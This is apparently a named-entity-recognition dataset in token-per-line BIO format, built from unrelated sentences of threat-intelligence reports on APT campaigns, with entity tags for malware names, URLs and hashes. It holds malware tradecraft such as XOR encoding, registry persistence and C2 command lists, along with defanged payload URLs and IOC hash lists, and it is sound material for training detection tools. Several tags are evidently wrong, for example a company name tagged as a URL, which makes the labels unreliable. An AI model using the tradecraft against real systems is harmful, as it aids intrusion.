or	O
contain	O
a	O
malicious	O
URL	O
designed	O
to	O
harvest	O
the	O
recipients	O
'	O
email	O
credentials	O
and	O
provide	O
access	O
to	O
the	O
their	O
accounts	O
.	O

Labeled	O
by	O
the	O
media	O
as	O
cyber	O
terror	O
,	O
the	O
attack	O
significantly	O
disrupted	O
these	O
services	O
for	O
at	O
least	O
one	O
day	O
.	O

This	O
year	O
we	O
have	O
been	O
able	O
to	O
finally	O
isolate	O
the	O
Mac	O
OS	O
X	O
counterpart	O
-	O
the	O
XAgent	B-malware.backdoor
modular	I-malware.backdoor
backdoor	O
.	O

While	O
the	O
victim	O
is	O
distracted	O
with	O
the	O
legitimate	O
looking	O
Word	O
document	O
,	O
an	O
additional	O
executable	O
which	O
is	O
archived	O
alongside	O
the	O
decoy	O
document	O
is	O
installed	O
in	O
the	O
background	O
.	O

Albert	O
Einstein	O
best	O
described	O
this	O
intertwining	O
phenomenon	O
as	O
'	O
1	O
.	O

Figure	O
5	O
:	O
APT32	B-malware.infosteal
Phishing	O
Chain	O
of	O
Events	O
The	O
impressive	O
APT32	B-malware.infosteal
operations	O
did	O
not	O
stop	O
after	O
they	O
established	O
a	O
foothold	O
in	O
victim	O
environments	O
.	O

Divide	O
and	O
conquer	O
-	O
Each	O
tool	O
communicated	O
with	O
different	O
sets	O
of	O
C	O
&	O
C	O
servers	O
domains	O
,	O
which	O
usually	O
came	O
in	O
triads	O
.	O

Figure	O
22	O
.	O

About	O
60	O
%	O
of	O
targeted	O
the	O
email	O
addresses	O
where	O
Gmail	O
,	O
Hotmail	O
and	O
Yahoo	O
accounts	O
.	O

I	O
ran	O
the	O
victim	O
malware	O
and	O
changed	O
the	O
host	O
's	O
file	O
to	O
point	O
the	O
domain	O
to	O
a	O
host-only	O
IP	O
address	O
.	O

A	O
consistent	O
attack	O
flow	O

The	O
binary	O
is	O
encoded	O
using	O
a	O
variable	O
4-byte	O
XOR	O
key	O
that	O
is	O
generated	O
by	O
starting	O
with	O
the	O
4-byte	O
key	O
0x7FFEFC00	O
;	O
this	O
XOR	O
key	O
is	O
then	O
permutated	O
every	O
four	O
bytes	O
by	O
rotating	O
the	O
first	O
two	O
bytes	O
of	O
the	O
key	O
by	O
0x1	O
and	O
shifting	O
the	O
bits	O
of	O
the	O
next	O
two	O
bytes	O
right	O
by	O
0x1	O
,	O
so	O
the	O
next	O
4-byte	O
XOR	O
key	O
in	O
the	O
series	O
would	O
be	O
0x3FFF7E00	O
.	O

The	O
malware	O
displays	O
fake	O
forms	O
on	O
top	O
of	O
the	O
banking	O
sites	O
and	O
intercepts	O
credentials	O
from	O
the	O
victims	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

283	O
Fax	O
:	O
+966	O
13	O
340	O
4869	O
Email	O
:	O
diosdado@lilbello[.]com	O

Command	O
added	O
when	O
the	O
Koadic	B-malware.unknown
RAT	O
is	O
downloaded	O
(	O
use	O
of	O
{	O
Variable	O
}	O
.shell.exec	O
command	O
)	O

In	O
December	O
2016	O
we	O
published	O
two	O
detailed	O
blogposts	O
about	O
disruptive	O
attacks	O
conducted	O
by	O
the	O
group	O
ESET	O
researchers	O
call	O
TeleBots	O
,	O
specifically	O
about	O
attacks	O
against	O
financial	O
institutions	O
and	O
a	O
Linux	O
version	O
of	O
the	O
KillDisk	B-malware.ransom
malware	O
used	O
by	O
this	O
group	O
.	O

hashes	O
could	O
be	O
mapped	O
to	O
known	O
names	O
of	O
anti-virus	O
solutions	O
.	O

Image	O
1	O
.	O

Export	O
functions	O
of	O
the	O
original	O
Outllib.dll	O
file	O
There	O
is	O
also	O
a	O
big	O
difference	O
in	O
the	O
file	O
size	O
.	O

This	O
post	O
describes	O
the	O
results	O
of	O
a	O
comprehensive	O
global	O
Internet	O
scan	O
for	O
the	O
command	O
and	O
control	O
servers	O
of	O
FinFisher	B-malware.backdoor
's	O
surveillance	O
software	O
.	O

WIN-T9UN4HIIHEC	O
-	O
>	O
is	O
the	O
hostname	O
of	O
the	O
infected	O
system	O
Administrator	O
-	O
>	O
is	O
the	O
username	O
16-12-04	O
-	O
>	O
is	O
the	O
infection	O
date	O
No	O
-	O
>	O
Indicates	O
that	O
the	O
system	O
has	O
no	O
camera	O

It	O
appears	O
to	O
be	O
a	O
resume	O
of	O
someone	O
from	O
Kyoto	O
University	O
in	O
Japan	O
who	O
was	O
involved	O
in	O
English	O
language	O
studies	O
.	O

Partly	O
because	O
this	O
campaign	O
is	O
very	O
limited	O
and	O
highly	O
targeted	O
,	O
we	O
have	O
not	O
yet	O
been	O
able	O
to	O
identify	O
how	O
this	O
malware	O
is	O
being	O
distributed	O
.	O

DarkHotel	O
can	O
be	O
regarded	O
as	O
one	O
of	O
its	O
series	O
of	O
attack	O
activities	O
.	O

The	O
malware	O
uses	O
images	O
of	O
members	O
of	O
the	O
Ethiopian	O
opposition	O
group	O
,	O
Ginbot	O
7	O
,	O
as	O
bait	O
.	O

It	O
's	O
unclear	O
whether	O
this	O
password	O
is	O
provided	O
by	O
any	O
means	O
,	O
for	O
example	O
in	O
the	O
email	O
it	O
was	O
attached	O
to	O
,	O
or	O
if	O
the	O
documents	O
are	O
simply	O
not	O
meant	O
to	O
work	O
.	O

The	O
modules	O
that	O
Cylance	O
has	O
observed	O
so	O
far	O
provided	O
the	O
ability	O
to	O
:	O
•	O
Upload	O
specific	O
files	O
to	O
the	O
C2	O
•	O
Download	O
a	O
file	O
to	O
the	O
infected	O
machine	O
•	O
Load	O
and	O
execute	O
a	O
DLL	O
payload	O
•	O
List	O
running	O
processes	O
and	O
services	O
•	O
Execute	O
a	O
shell	O
command	O
•	O
Add	O
an	O
additional	O
layer	O
of	O
AES	O
encryption	O
to	O
the	O
network	O
protocol	O
•	O
Search	O
for	O
a	O
keyword	O
in	O
files	O
Legacy	O
AV	O
appears	O
to	O
have	O
fairly	O
good	O
coverage	O
for	O
most	O
of	O
the	O
samples	O
;	O
however	O
,	O
minor	O
changes	O
in	O
newer	O
samples	O
have	O
considerably	O
lower	O
detection	O
rates	O
.	O

msgPacket	O
.	O

Using	O
telemetry	O
from	O
the	O
FireEye	O
Dynamic	O
Threat	O
Intelligence	O
(	O
DTI	O
)	O
cloud	O
,	O
we	O
examined	O
165	O
XtremeRAT	B-malware.backdoor
samples	O
from	O
attacks	O
that	O
primarily	O
hit	O
the	O
following	O
sectors	O
:	O
Energy	O
,	O
utilities	O
,	O
and	O
petroleum	O
refining	O
Financial	O
Services	O
High-tech	O
These	O
incidents	O
include	O
a	O
spectrum	O
of	O
attacks	O
including	O
targeted	O
attacks	O
as	O
well	O
as	O
indiscriminate	O
attacks	O
.	O

This	O
intelligence	O
has	O
been	O
critical	O
to	O
protecting	O
and	O
informing	O
our	O
clients	O
,	O
exposing	O
this	O
threat	O
,	O
and	O
strengthening	O
our	O
confidence	O
in	O
attributing	O
APT28	B-malware.infosteal
to	O
the	O
Russian	O
Government	O
.	O

Skipping	O
past	O
the	O
obligatory	O
checks	O
for	O
empty	O
source	O
buffers	O
,	O
etc.	O
,	O
we	O
arrive	O
at	O
some	O
code	O
that	O
loops	O
over	O
the	O
source	O
buffer	O
,	O
referenced	O
by	O
src_buf_var_4	O
;	O
however	O
,	O
it	O
makes	O
only	O
one	O
loop	O
iteration	O
for	O
every	O
two	O
bytes	O
in	O
src_buf_var_4	O
.	O

@	O
þÿÌ3Ð	O
¤b	O
̄Opþ192.168.131.67JRecordingEcsv	O
0þ-0800UTC	O
DST.1þ2012-07-18	O
18:00:21.:þ1970-01-01	O
00:16:00Abhwatch1	O

Then	O
we	O
are	O
shocked	O
when	O
a	O
security	O
company	O
discovers	O
an	O
APT	B-malware.unknown
campaign	O
that	O
has	O
supposedly	O
gone	O
unnoticed	O
for	O
years	O
.	O

This	O
could	O
be	O
a	O
trick	O
to	O
make	O
the	O
recipient	O
even	O
more	O
curious	O
to	O
look	O
at	O
the	O
attached	O
document	O
,	O
because	O
he/she	O
received	O
documents	O
not	O
issued	O
for	O
him/her	O
.	O

To	O
bypass	O
the	O
anti-analysis	O
technique	O
and	O
to	O
extract	O
the	O
content	O
stored	O
in	O
the	O
TextBox	O
within	O
the	O
UserForm	O
the	O
password	O
protection	O
was	O
bypassed	O
which	O
allowed	O
to	O
extract	O
the	O
content	O
stored	O
within	O
the	O
UserForm	O
.	O

The	O
header	O
values	O
are	O
hardcoded	O
in	O
the	O
payload	O
,	O
specifically	O
the	O
values	O
for	O
'	O
User-Agent	O
'	O
,	O
'	O
Cache-Control	O
'	O
and	O
the	O
bytes	O
at	O
offset	O
0	O
of	O
the	O
stub	O
(	O
\xcf\xcf	O
)	O
may	O
be	O
of	O
interest	O
to	O
network	O
defenders	O
.	O

During	O
that	O
phase	O
,	O
the	O
threat	O
actor	O
operated	O
a	O
fileless	B-malware.unknown
PowerShell-based	O
infrastructure	O
,	O
using	O
customized	O
PowerShell	O
payloads	O
taken	O
from	O
known	O
offensive	O
frameworks	O
such	O
as	O
Cobalt	O
Strike	O
,	O
PowerSploit	O
and	O
Nishang	O
.	O

The	O
extra	O
layer	O
of	O
public	O
key	O
cryptography	O
,	O
with	O
a	O
randomly	O
generated	O
key	O
,	O
is	O
crucial	O
here	O
.	O

On	O
March	O
12th	O
,	O
US	O
Director	O
of	O
National	O
Intelligence	O
James	O
Clapper	O
stated	O
in	O
his	O
yearly	O
congressional	O
report	O
on	O
security	O
threats	O
:	O

This	O
file	O
was	O
created	O
26	O
days	O
after	O
the	O
death	O
of	O
Sarabjit	O
Singh	O
,	O
and	O
would	O
be	O
of	O
relevance	O
to	O
targeted	O
Indian	O
entities	O
,	O
much	O
like	O
the	O
official	O
Government	O
of	O
India	O
(	O
GoI	O
)	O
,	O
Ministry	O
of	O
Defense	O
(	O
MoD	O
)	O
pension	O
memorandum	O
.	O

At	O
the	O
endpoint	O
level	O
,	O
Trend	O
MicroTM	O
Smart	O
Protection	O
Suites	O
deliver	O
several	O
capabilities	O
that	O
minimize	O
the	O
impact	O
of	O
these	O
attacks	O
.	O

14	O
Sept	O
.	O

The	O
macro	O
then	O
decodes	O
a	O
PowerShell	O
script	O
which	O
downloads	O
base64	O
encoded	O
content	O
from	O
the	O
pastebin	O
url	O
.	O

Why	O
are	O
there	O
infections	O
in	O
other	O
countries	O
than	O
Ukraine	O
?	O

Data	O
transmission	O
from	O
the	O
attacker	O
's	O
server	O
to	O
the	O
client	O
is	O
protected	O
by	O
a	O
custom	O
cryptosystem	O
(	O
Figure	O
3	O
)	O
leveraging	O
a	O
symmetric	O
cipher	O
(	O
AES	O
)	O
,	O
that	O
protects	O
the	O
data	O
payload	O
and	O
an	O
asymmetric	O
cipher	O
(	O
RSA	O
)	O
to	O
protect	O
the	O
symmetric	O
key	O
.	O

Calls	O
recv	O
(	O
)	O
to	O
read	O
network	O
traffic	O
into	O
a	O
buffer	O
;	O
2	O
.	O

The	O
second	O
backdoor	O
,	O
which	O
was	O
written	O
in	O
VBS	B-malware.backdoor
and	O
packaged	O
using	O
the	O
script2exe	O
program	O
,	O
was	O
heavily	O
obfuscated	O
but	O
the	O
functionality	O
remained	O
the	O
same	O
as	O
in	O
previous	O
attacks	O
.	O

The	O
indicators	O
are	O
provided	O
below	O
,	O
these	O
indicators	O
can	O
be	O
used	O
by	O
the	O
organizations	O
(	O
Government	O
,	O
Public	O
and	O
Private	O
organizations	O
)	O
to	O
detect	O
and	O
investigate	O
this	O
attack	O
campaign	O
.	O

관리	O
서버는	O
연	O
결된	O
시스템에	O
일괄적으로	O
파일을	O
보내거나	O
정책을	O
적용하며	O
원격	O
제어를	O
할	O
수	O
있다	O
.	O

Executable	O
CozyDuke	B-malware.drop
main	O
component	O

South	O
Korea	O
's	O
National	O
Intelligence	O
Service	O
(	O
NIS	O
)	O
previously	O
leveraged	O
It	O
Itch	O
's	O
services	O
,	O
as	O
documented	O
by	O
Citizen	O
Lab	O
in	O
this	O
post	O
.	O

The	O
next	O
most	O
common	O
is	O
port	O
53	O
.	O

Subsequent	O
keep-alive	O
transmissions	O
ensure	O
a	O
continuous	O
connection	O
.	O

Civil	O
society	O
groups	O
have	O
found	O
cause	O
for	O
concern	O
in	O
these	O
findings	O
,	O
as	O
they	O
indicate	O
the	O
use	O
of	O
FinFisher	B-malware.backdoor
products	O
by	O
countries	O
like	O
Turkmenistan	O
and	O
Bahrain	O
with	O
problematic	O
records	O
on	O
human	O
rights	O
,	O
transparency	O
,	O
and	O
rule	O
of	O
law	O
.	O

The	O
request	O
object	O
will	O
look	O
for	O
chr	O
(	O
42	O
)	O
which	O
is	O
an	O
asterisk	O
(	O
*	O
)	O
,	O
returning	O
whatever	O
is	O
passed	O
to	O
it	O
in	O
a	O
HTTP	O
GET	O
or	O
POST	O
.	O

Applying	O
our	O
DarkComet	B-malware.backdoor
encryption	O
module	O
against	O
the	O
observed	O
traffic	O
results	O
in	O
the	O
following	O
:	O

So	O
to	O
narrow	O
down	O
on	O
the	O
actual	O
bot-C	O
&	O
C	O
comms	O
loop	O
,	O
we	O
locate	O
the	O
lengthy	O
list	O
of	O
command	O
strings	O
,	O
such	O
as	O
KeylogOn	O
,	O
GetOfflineLogs	O
,	O
WEBCAMLIVE	O
,	O
GetMsnList	O
,	O

hxxp://pastebin.com/raw/5j4hc8gT	B-url.unknown
hxxp://pastebin.com/raw/6bwniBtB	B-url.unknown

Egypt	O
's	O
Ambassador	O
in	O
the	O
Ukraine	O
,	O
Counsellor	O
of	O
Permanent	O
Mission	O
of	O
Egypt	O
to	O
the	O
United	O
Nations	O
,	O
the	O
Egyptian	O
Embassy	O
in	O
New	O
Zealand	O
,	O
and	O
Egyptian	O
Embassy	O
in	O
Pakistan	O
.	O

Last	O
accessed	O
August	O
30	O
,	O
2013	O
.	O

The	O
second	O
named	O
scheduled	O
task	O
,	O
loaded	O
as	O
an	O
XML	O
file	O
to	O
falsify	O
task	O
attributes	O
,	O
ran	O
a	O
JavaScript	O
code	O
block	O
that	O
downloaded	O
and	O
launched	O
a	O
secondary	O
backdoor	O
,	O
delivered	O
as	O
a	O
multi-stage	O
PowerShell	O
script	O
.	O

4d667af648047f2bd24511ef8f36c9cc	O
-	O
NATO	O
position	O
on	O
Syria.scr	O
ab686acde338c67bec8ab42519714273	O
-	O
Russia	O
position	O
on	O
Syria.scr	O
1c3634c7777bd6667936ec279bac5c2a	O
-	O
Talking	O
Points.scr	O
80323d1f7033bf33875624914a6a6010	O
-	O
Program.scr	O
77083b1709681d43a1b0503057b6f096	O
-	O
Security	O
protocol.scr	O
01a15540481f28163e7b4908034efbe3	O
-	O
unknown.exe	O
(	O
'	O
WorldCupSec	O
'	O
)	O
6a24071fde3b5d713c58801dcdd62044	O
-	O
unknown.exe	O
(	O
'	O
WorldCupSec	O
'	O
)	O
626955d20325371aca2742a70d6861ab	O
-	O
unknown.exe	O
(	O
'	O
TadjMakhal	O
'	O
)	O
16eba8e5f0440a213935e1af4976d801	O
-	O
unknown.exe	O
(	O
'	O
RussiaPositions	O
'	O
)	O
0c35a8f9f9b6ab2f7e3b4408abc61f73	O
-	O
pdfview.exe	O
d685403d000f8f6b25a6746f6f05a51c	O
-	O
winword.exe	O

2017년	O
5월부터	O
7월까지는	O
금융권을	O
집중	O
공격했다	O
.	O

So	O
do	O
we	O
believe	O
this	O
campaign	O
is	O
focused	O
only	O
at	O
Israeli	O
companies	O
?	O

certificates	O
from	O
the	O
fake	O
APK	O
:	O

After	O
sending	O
the	O
server	O
information	O
via	O
the	O
VictimInfoPacket	O
,	O
the	O
server	O
variant	O
spins	O
off	O
a	O
thread	O
for	O
the	O
connection	O
and	O
returns	O
to	O
waiting	O
for	O
new	O
connections	O
from	O
clients	O
to	O
appear	O
.	O

findFilesAtPath	O
:	O
withMask	O
:	O
andRecursion	O
:	O
]	O

Time	O
is	O
of	O
the	O
essence	O
;	O
when	O
it	O
comes	O
to	O
data	O
breaches	O
there	O
is	O
often	O
significant	O
damage	O
by	O
the	O
time	O
a	O
threat	O
is	O
detected	O
.	O

Certain	O
router	O
manufacturers	O
have	O
UPnP	O
listening	O
on	O
WAN	O
as	O
a	O
default	O
con guration	O
.	O

In	O
the	O
earlier	O
version	O
of	O
this	O
backdoor	O
,	O
the	O
'd	O
'	O
command	O
was	O
referenced	O
,	O
but	O
the	O
code	O
had	O
not	O
been	O
implemented	O
yet	O
.	O

The	O
field	O
unit	O
conducts	O
reconnaissance	O
and	O
data	O
collection	O
in	O
accordance	O
with	O
particular	O
commands	O
.	O

In	O
March	O
2018	O
we	O
detected	O
an	O
ongoing	O
campaign	O
targeting	O
a	O
national	O
data	O
center	O
in	O
the	O
Central	O
Asia	O
that	O
we	O
believe	O
has	O
been	O
active	O
since	O
autumn	O
2017.T	O
he	O
choice	O
of	O
target	O
made	O
this	O
campaign	O
especially	O
significant	O
–	O
it	O
meant	O
the	O
attackers	O
gained	O
access	O
to	O
a	O
wide	O
range	O
of	O
government	O
resources	O
at	O
one	O
fell	O
swoop	O
.	O

As	O
part	O
of	O
the	O
analysis	O
of	O
the	O
domains	O
and	O
IPs	O
that	O
were	O
used	O
in	O
this	O
operation	O
,	O
Cybereason	O
found	O
samples	O
that	O
were	O
caught	O
'	O
in-the-wild	O
'	O
(	O
that	O
were	O
not	O
part	O
of	O
Operation	O
Cobalt	O
Kitty	O
)	O
.	O

When	O
found	O
and	O
the	O
e-mail	O
maintains	O
an	O
attachment	O
,	O
the	O
malware	O
downloads	O
this	O
attachment	O
and	O
saves	O
it	O
with	O
filename	O

The	O
Russian	O
government	O
views	O
the	O
U.S.	O
as	O
a	O
strategic	O
rival	O
and	O
is	O
known	O
to	O
task	O
its	O
intelligence	O
agencies	O
with	O
gathering	O
confidential	O
information	O
about	O
individuals	O
and	O
organizations	O
close	O
to	O
the	O
center	O
of	O
power	O
in	O
the	O
U.S.	O
Individuals	O
working	O
for	O
the	O
Hillary	O
for	O
America	O
campaign	O
could	O
have	O
information	O
about	O
proposed	O
policies	O
for	O
a	O
Clinton	O
presidency	O
,	O
including	O
foreign-policy	O
positions	O
,	O
which	O
would	O
be	O
valuable	O
to	O
the	O
Russian	O
government	O
.	O

deleteFile	O
:	O
]	O

The	O
threat	O
actors	O
are	O
not	O
particularly	O
sophisticated	O
,	O
but	O
it	O
is	O
well-understood	O
that	O
such	O
attacks	O
do	O
n't	O
need	O
to	O
be	O
sophisticated	O
in	O
order	O
to	O
be	O
effective	O
.	O

To	O
report	O
infection	O
status	O
,	O
the	O
malware	O
reads	O
from	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBoledvbs.inc	O
which	O
contains	O
the	O
systeminfo	O
command	O
output	O
.	O

We	O
do	O
not	O
know	O
the	O
meaning	O
of	O
the	O
'	O
PRS	O
'	O
suffix	O
added	O
in	O
the	O
case	O
of	O
Dino	B-malware.backdoor
.	O

Chafer	O
appears	O
to	O
have	O
been	O
undeterred	O
by	O
its	O
exposure	O
in	O
2015	O
and	O
continued	O
to	O
be	O
very	O
active	O
during	O
2017	O
,	O
using	O
seven	O
new	O
tools	O
,	O
rolling	O
out	O
new	O
infrastructure	O
,	O
and	O
attacking	O
nine	O
new	O
target	O
organizations	O
in	O
the	O
region	O
.	O

Incorrect	O
grammar	O
phrases	O
in	O
the	O
C2	O
websites	O
also	O
assisted	O
in	O
uncovering	O
the	O
operation	O
infrastructure	O
.	O

Both	O
Qihoo	O
360	O
and	O
FireEye	B-url.normal
demonstrate	O
in	O
their	O
reports	O
that	O
the	O
threat	O
actor	O
is	O
involved	O
in	O
campaigns	O
in	O
different	O
Asian	O
countries	O
,	O
such	O
as	O
Vietnam	O
,	O
China	O
,	O
and	O
the	O
Philippines	O
.	O

DNS	O
:	O

The	O
technique	O
can	O
be	O
used	O
to	O
find	O
patched	O
code	O
snippets	O
in	O
the	O
software	O
and	O
to	O
find	O
code	O
that	O
was	O
vulnerable	O
for	O
attack	O
.	O

The	O
targets	O
were	O
similar	O
to	O
a	O
2015	O
TG-4127	B-malware.infosteal
campaign	O
—	O
individuals	O
in	O
Russia	O
and	O
the	O
former	O
Soviet	O
states	O
,	O
current	O
and	O
former	O
military	O
and	O
government	O
personnel	O
in	O
the	O
U.S.	O
and	O
Europe	O
,	O
individuals	O
working	O
in	O
the	O
defense	O
and	O
government	O
supply	O
chain	O
,	O
and	O
authors	O
and	O
journalists	O
—	O
but	O
also	O
included	O
email	O
accounts	O
linked	O
to	O
the	O
November	O
2016	O
United	O
States	O
presidential	O
election	O
.	O

*	O
For	O
the	O
latest	O
data	O
,	O
please	O
visit	O
McAfee	O
Aurora	B-malware.infosteal
site	O
http://www.mcafee.com/us/threat_center/operation_aurora.html	B-url.unknown

Filenames	O

a1=6fcadf059e54a19c7b96b0758a2d20a4396b85e77138dbaff3fddd04909de91	O
62a8910eab1141343492e90a78e75bfa7cafa3ed0a51740daa4cad36291e637074255217	O
–omitted-HTTP/1.1	O
Connection	O
:	O
Keep-Alive	O
Content-Type	O
:	O
text/plain	O
;	O
charset=utf-8	O
Accept	O
:	O
*/*	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
5.1	O
)	O
AppleWebKit/537.36	O
(	O
KHTML	O
,	O
like	O
Gecko	O
)	O
Chrome/27.0.1453.116	O
Safari/537.36	O
Host	O
:	O
[	O
host	O
name	O
]	O

The	O
dropper	O
has	O
2	O
DLLs	O
stored	O
in	O
its	O
resources	O
;	O
they	O
are	O
XOR'ed	O
in	O
such	O
way	O
that	O
the	O
current	O
byte	O
is	O
XOR'ed	O
with	O
the	O
previous	O
byte	O
.	O

The	O
first	O
conference	O
of	O
Dr	O
.	O

Currently	O
,	O
visitors	O
to	O
the	O
Freegate	B-malware.infosteal
website	O
follow	O
non-HTTPS	O
links	O
to	O
an	O
unencrypted	O
download	O
.	O

s2.send	O
(	O
encode	O
(	O
'	O
Refresh	O
'	O
)	O
+	O
'	O
\x00	O
'	O
)	O
53.	O
elif	O
dec.startswith	O
(	O
'	O
OnLine	O
'	O
)	O
:	O
54	O
.	O

Appendix	O
A	O
|	O
Sample	O
hashes	O
Appendix	O
B	O
:	O
IOCs	O

This	O
analysis	O
shows	O
us	O
seven	O
years	O
of	O
the	O
evolution	O
of	O
a	O
Remote	O
Administration	O
Tool	O
,	O
used	O
by	O
a	O
group	O
which	O
targeted	O
extremely	O
sensitive	O
entities	O
,	O
such	O
as	O
the	O
US	O
Pentagon	O
in	O
2008	O
or	O
the	O
Belgium	O
Ministry	O
of	O
Foreign	O
Affairs	O
in	O
2014	O
as	O
well	O
as	O
the	O
Finnish	O
Ministry	O
of	O
Foreign	O
Affairs	O
.	O

For	O
grabbing	O
audio	O
streams	O
Babar	B-malware.drop
includes	O
code	O
from	O
the	O
OpenCORE	O
AMR	O
library.AMR	O
enables	O
the	O
malware	O
to	O
encode	O
and	O
decode	O
raw	O
audio	O
frames	O
as	O
they	O
are	O
passed	O
to	O
or	O
grabbed	O
from	O
the	O
audio	O
devices	O
.	O

We	O
also	O
observed	O
the	O
malware	O
is	O
distributed	O
through	O
spear-phishing	O
campaigns	O
that	O
involve	O
social	O
engineering	O
with	O
LNK	O
files	O
.	O

Location	O
C.	O
is	O
the	O
actual	O
execution	O
of	O
the	O
malware	O
service	O
,	O
which	O
remains	O
persistent	O
.	O

3030	O
'	O
.	O

To	O
achieve	O
this	O
,	O
CozyDuke	B-malware.drop
will	O
'	O
hijack	O
'	O
the	O
registry	O
entries	O
for	O
the	O
COM	O
object	O
'	O
SharedTaskScheduler	O
'	O
.	O

The	O
communication	O
between	O
the	O
server	O
and	O
the	O
client	O
at	O
this	O
point	O
,	O
and	O
for	O
the	O
remainder	O
of	O
the	O
session	O
,	O
is	O
encrypted	O
.	O

3	O
.	O

The	O
email	O
was	O
made	O
to	O
look	O
like	O
as	O
if	O
an	O
investigation	O
report	O
related	O
to	O
Uri	O
terror	O
attack	O
was	O
shared	O
by	O
the	O
MHA	O
official	O
.	O

'taskmgr.exe	O
'	O
.	O

As	O
expected	O
,	O
the	O
malware	O
does	O
not	O
really	O
bypass	O
the	O
UAC	O
.	O

After	O
installation	O
was	O
completed	O
,	O
Iron	B-malware.backdoor
Backdoor	I-malware.backdoor
uses	O
Everything	O
in	O
order	O
to	O
find	O
files	O
that	O
are	O
likely	O
to	O
contain	O
cryptocurrency	O
wallets	O
,	O
by	O
filename	O
patterns	O
in	O
both	O
English	O
and	O
Chinese	O
.	O

Obviously	O
,	O
highly	O
automated	O
commercial	O
platform	O
realized	O
a	O
high	O
speed	O
of	O
spread	O
of	O
this	O
attack	O
capability	O
(	O
exceeded	O
our	O
anticipation	O
)	O
.	O

Cabinet	O
file	O
,	O
which	O
is	O
saved	O
as	O
YjhdJ.cab	O
(	O
MD5	O
hash	O
:	O
44c7319d8d7b84c52c4a6c94056d246b	B-hash
)	O
expand	O
'	O
,	O
again	O
a	O
legitimate	O
Windows	O
program	O
,	O
to	O
'	O
expand	O
'	O
or	O
decompress	O
file	O
contents	O
(	O
AYRUNSC.exe	O
and	O
PTL.AYM	O
)	O
to	O
the	O
%	O
temp	O
%	O
folder	O
,	O
and	O
consequently	O
delete	O
the	O
earlier	O
created	O
files	O

powershell.exe	O
and	O
similar	O
;	O
•	O
File	O
Integrity	O
Monitoring	O
should	O
be	O
considered	O
and	O
configured	O
to	O
monitor	O
file	O
creations	O
in	O
'	O
trusted	O
'	O
locations	O
such	O
as	O
the	O
System32	O
directory	O
.	O

Instead	O
,	O
in-memory	O
modules	O
appear	O
in	O
isolation	O
.	O

2016	O
.	O

The	O
percentage	O
of	O
Russian	O
speakers	O
is	O
estimated	O
to	O
be	O
higher	O
in	O
Sevastopol	O
,	O
most	O
likely	O
dues	O
to	O
the	O
Russian	O
Naval	O
Base	O
in	O
the	O
region	O
.	O

Below	O
screen	O
shot	O
shows	O
a	O
network	O
communication	O
pattern	O
where	O
the	O
opened	O
window	O
title	O
was	O
sent	O
to	O
the	O
C2	O
server	O
,	O
this	O
pattern	O
below	O
indicates	O
that	O
'	O
test.txt	O
'	O
file	O
was	O
opened	O
with	O
notepad	O
on	O
the	O
infected	O
system	O
.	O

The	O
Web	B-malware.ransom
shell	O
client	O
was	O
originally	O
available	O
on	O
www.maicaidao.com	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

Together	O
they	O
form	O
a	O
re-packaged	O
exploit	O
for	O
Silverlight	O
based	O
on	O
CVE-2016-0034	O
(	O
MS16-006	O
)	O
–	O
a	O
Silverlight	O
Memory	O
Corruption	O
vulnerability	O
.	O

This	O
entry	O
was	O
posted	O
in	O
Botnets	O
,	O
Targeted	O
Attack	O
,	O
Threat	O
Intelligence	O
,	O
Threat	O
Research	O
and	O
tagged	O
advanced	O
malware	O
,	O
advanced	O
persistent	O
threat	O
,	O
advanced	O
targeted	O
attack	O
,	O
advanced	O
threat	O
actor	O
,	O
APT12	O
,	O
Targeted	O
Attack	O
by	O
Ned	O
Moran	O
,	O
Mike	O
Oppenheim	O
,	O
Sarah	O
Engle	O
and	O
Richard	O
Wartell	O
.	O

However	O
one	O
group	O
of	O
attackers	O
using	O
the	O
ScanBox	B-malware.infosteal
framework	O
are	O
now	O
actively	O
sending	O
e-mails	O
to	O
potential	O
victims	O
,	O
where	O
the	O
e-mails	O
contain	O
links	O
to	O
websites	O
hosting	O
ScanBox	B-malware.infosteal
.	O

It	O
registers	O
itself	O
in	O
the	O
registry	O
under	O
the	O
key	O
:	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\hlpAsist	O
RUNDLL32	O
'	O
%	O
USERPROFILE	O
%	O
\AppData\Roaming\Microsoft\MSDN\iodonk18.dll	O
'	O
,	O
IDLE	O
There	O
are	O
3	O
directories	O
on	O
the	O
server	O
:	O
obx	O
–	O
Contains	O
modules	O
used	O
by	O
the	O
main	O
module	O
ibx	O
–	O
Contains	O
exfiltrated	O
output	O
uploaded	O
by	O
the	O
plugins	O
rbx-	O
Contains	O
basic	O
information	O
about	O
the	O
connected	O
client	O
After	O
the	O
stored	O
data	O
is	O
retrieved	O
by	O
the	O
attackers	O
,	O
it	O
is	O
deleted	O
from	O
the	O
Dropbox	O
account	O
.	O

Combining	O
unmatched	O
experience	O
and	O
specialized	O
skills	O
across	O
more	O
than	O
40	O
industries	O
and	O
all	O
business	O
functions—underpinned	O
by	O
the	O
world	O
's	O
largest	O
delivery	O
network—Accenture	O
works	O
at	O
the	O
intersection	O
of	O
business	O
and	O
technology	O
to	O
help	O
clients	O
improve	O
their	O
performance	O
and	O
create	O
sustainable	O
value	O
for	O
their	O
stakeholders	O
.	O

Enrollment	O
could	O
be	O
done	O
through	O
physical	O
access	O
to	O
the	O
devices	O
,	O
or	O
most	O
likely	O
by	O
using	O
social	O
engineering	O
to	O
entice	O
a	O
user	O
to	O
register	O
.	O

After	O
a	O
four	O
week	O
lull	O
and	O
no	O
apparent	O
malicious	O
activity	O
,	O
the	O
attackers	O
returned	O
to	O
the	O
scene	O
and	O
introduced	O
new	O
and	O
improved	O
tools	O
aimed	O
at	O
bypassing	O
the	O
security	O
mitigations	O
that	O
were	O
implemented	O
by	O
the	O
company	O
's	O
IT	O
team	O
.	O

1	O
)	O
Freegate	B-malware.infosteal
should	O
take	O
steps	O
to	O
make	O
their	O
users	O
aware	O
of	O
the	O
threat	O
.	O

Attacks	O
on	O
East	O
Asia	O
using	O
Google	O
Code	O
for	O
Command	O
and	O
Control	O
–	O
Jen	O
Miller-Osborn	O
and	O
Rob	O
Downs	O
—	O
http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-googlecode-command-control/	B-url.normal
3	O
.	O

For	O
certain	O
functions	O
,	O
it	O
also	O
packs	O
and	O
pads	O
the	O
data	O
in	O
to	O
the	O
appropriate	O
